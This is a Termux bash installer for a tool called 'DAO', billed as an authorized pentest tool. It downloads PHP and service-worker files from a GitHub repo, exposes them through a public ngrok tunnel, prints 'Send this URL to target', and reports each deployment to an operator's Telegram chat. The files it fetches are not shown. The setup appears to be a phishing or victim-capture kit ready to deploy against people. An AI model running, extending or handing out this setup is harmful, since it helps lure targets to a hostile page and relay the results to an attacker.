#!/data/data/com.termux/files/usr/bin/bash
# One-click Termux DAO Installer - Interactive + Auto Config

echo "🔥 Termux DAO Installer - Authorized Pentest Tool"
echo "================================================"

# Install dependencies
echo "[1/6] Installing dependencies..."
pkg update -y &>/dev/null
pkg install -y php curl git screen wget &>/dev/null

# Create DAO directory
mkdir -p ~/dao
cd ~/dao

# Clone or update repo
if [ ! -f "dao.php" ]; then
    echo "[2/6] Downloading DAO files..."
    wget -q https://raw.githubusercontent.com/AS-1483/termux-dao-oneclick/main/dao.php
    wget -q https://raw.githubusercontent.com/AS-1483/termux-dao-oneclick/main/config.php
    wget -q https://raw.githubusercontent.com/AS-1483/termux-dao-oneclick/main/sw.js
    wget -q https://raw.githubusercontent.com/AS-1483/termux-dao-oneclick/main/start.sh
    chmod +x start.sh
else
    echo "[2/6] DAO files already exist"
fi

# Interactive config
echo "[3/6] Interactive Configuration"
read -p "Enter NGROK_AUTH_TOKEN: " NGROK_TOKEN
read -p "Enter TELEGRAM_BOT_TOKEN: " BOT_TOKEN
read -p "Enter TELEGRAM_CHAT_ID: " CHAT_ID

# Auto-config config.php
cat > config.php << EOF
<?php
\$config = [
    'ngrok_token' => '$NGROK_TOKEN',
    'bot_token' => '$BOT_TOKEN', 
    'chat_id' => '$CHAT_ID',
    'ngrok_url' => '', // Auto-detected
];
?>
EOF

# Create start script with auto ngrok detection
cat > start.sh << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
cd ~/dao

# Kill existing sessions
screen -ls | grep dao && screen -S dao -X quit &>/dev/null

# Start PHP server in screen
screen -dmS dao-php php -S 127.0.0.1:8080

# Wait for PHP server
sleep 3

# Start ngrok tunnel and capture URL
echo "Starting ngrok tunnel..."
NGROK_URL=$(ngrok http 8080 --authtoken="$NGROK_TOKEN" 2>&1 | grep -o 'https://[a-z0-9-]*\.ngrok-free.app' | head -1)

if [ -n "$NGROK_URL" ]; then
    # Update config.php with ngrok URL
    sed -i "s|'ngrok_url' => '',|'ngrok_url' => '$NGROK_URL',|" config.php
    
    echo "✅ DAO LIVE: $NGROK_URL"
    echo "📱 Send this URL to target"
    echo "🔄 Background screen sessions: dao-php, dao-ngrok"
    
    # Start ngrok in screen
    screen -dmS dao-ngrok ngrok http 8080 --authtoken="$NGROK_TOKEN"
    
    # Send Telegram notification
    curl -s "https://api.telegram.org/bot/$BOT_TOKEN/sendMessage" \
        -d chat_id="$CHAT_ID" \
        -d text="🚀 DAO DEPLOYED: $NGROK_URL"
else
    echo "❌ Ngrok URL detection failed. Check NGROK_TOKEN."
fi
EOF

chmod +x start.sh

echo "[4/6] Setup complete!"
echo "[5/6] Starting DAO (background)..."
./start.sh

echo "[6/6] ✅ DAO is LIVE!"
echo ""
echo "📱 Active URLs:"
grep -o 'https://[a-z0-9-]*\.ngrok-free.app' config.php || echo "Check 'screen -r dao-ngrok'"
echo ""
echo "🔧 Management Commands:"
echo "  screen -r dao-php     # View PHP server"
echo "  screen -r dao-ngrok   # View ngrok tunnel" 
echo "  cd ~/dao && ./start.sh # Restart"
echo "  pkill -f php          # Stop PHP"
echo "  pkill -f ngrok        # Stop ngrok"
